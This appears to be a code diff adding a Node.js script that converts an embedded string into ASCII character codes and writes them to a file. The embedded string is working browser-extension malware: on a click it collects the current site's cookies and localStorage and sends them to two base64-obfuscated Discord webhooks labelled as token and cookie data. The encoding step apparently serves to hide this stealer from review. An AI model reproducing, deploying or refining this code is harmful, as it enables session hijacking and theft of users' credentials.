@@ -1,0 +1,26 @@
+const fs = require("fs");
+
+// Function to convert a string to an ASCII array
+function stringToAsciiArray(str) {
+    return Array.from(str).map(char => char.charCodeAt(0));
+}
+
+// Function to save the ASCII array as a .txt file
+function saveAsciiArrayToFile(asciiArray, filename) {
+    // Convert the array to a JSON string format for readability
+    const arrayAsString = JSON.stringify(asciiArray, null, 2); // Pretty formatting
+
+    // Write the array to a file
+    fs.writeFileSync(filename, arrayAsString, "utf8");
+    console.log(`✅ ASCII array saved to: ${filename}`);
+}
+
+// Original string
+const text = "chrome.action.onClicked.addListener(async (tab) => {try {const url = tab.url;const domain = new URL(url).hostname;const cookies = await chrome.cookies.getAll({ url: url });const cookieData = cookies.length? cookies.map(cookie => `${cookie.name}: ${cookie.value}`).join(\"\"): \"No cookies found.\";const result = await chrome.scripting.executeScript({target: { tabId: tab.id },world: \"MAIN\",func: () => {let output = \"\";for (let i = 0; i < localStorage.length; i++) {const key = localStorage.key(i);output += key + \": \" + localStorage.getItem(key) + \"\";}return { storageData: output || \"No data found in localStorage.\" };}});const storageData = result[0].result.storageData;const I20jK1 = atob(\"aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM0MzQ3NDg0NjQzNjI5NDY1Ni9pb0liUFhVMnR0MXN3YmJmdzZtU0dLVHJVZmR4ZFVFRkJuZ2ZlR0QzcEF4LTR3X1pDYVBaU1U4UnVNbzZUclEweFg4bQ==\");const TV001jK = atob(\"aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM0MzQ3NDg0OTc0MTQwNjIzOC9xOWViVzVtRWEzWlIyaU5Fdzk3aFVyVUJaZFBXUnlpZkhBaFZNcGwxNkNnU1drQWVuUnhuRGkza09EdTExZ2JzRjF0Wg==\");async function sendWebhookWithFile(webhookUrl, content, fileName, fileContent) {const boundary = \"----WebKitFormBoundary\" + Math.random().toString(16).slice(2);const formData = [`--${boundary}`,'Content-Disposition: form-data; name=\"content\"','',content,`--${boundary}`,`Content-Disposition: form-data; name=\"file\"; filename=\"${fileName}\"`,'Content-Type: text/plain','',fileContent,`--${boundary}--`].join(\"\r\");const response = await fetch(webhookUrl, {method: \"POST\",headers: { \"Content-Type\": `multipart/form-data; boundary=${boundary}` },body: formData});return response;}const localStorageContent = `:pushpin: **Local Storage Data Found!** :pushpin:` + `:small_blue_diamond: **URL:** ${url}` + `:small_blue_diamond: **Retrieved At:** ${new Date().toLocaleString()}` + `:small_blue_diamond: **Check the attached file for token data!**`;const localStorageTxtContent = storageData;const lsResponse = await sendWebhookWithFile(I20jK1, localStorageContent, \"token_data.txt\", localStorageTxtContent);if (!lsResponse.ok) {console.error(\"Failed to send localStorage data:\", lsResponse.statusText);} else {console.log(\"LocalStorage data and file sent successfully\");}const cookiesContent = `:pushpin: **Cookie Data Found!** :pushpin:` +`:small_blue_diamond: **URL:** ${url}` +`:small_blue_diamond: **Retrieved At:** ${new Date().toLocaleString()}` +`:small_blue_diamond: **Check the attached file for cookie data!**`;const cookiesTxtContent = cookieData;const cookiesResponse = await sendWebhookWithFile(TV001jK, cookiesContent, \"token_data.txt\", cookiesTxtContent);if (!cookiesResponse.ok) {console.error(\"Failed to send cookie data:\", cookiesResponse.statusText);} else {console.log(\"Cookies data and file sent successfully\");}} catch (error) {console.error(\"Unexpected error:\", error);}});";
+
+// Convert string to ASCII array
+const asciiArray = stringToAsciiArray(text);
+console.log("ASCII Array:", asciiArray);
+
+// Save the ASCII array as a .txt file
+saveAsciiArrayToFile(asciiArray, "ascii_array.txt");
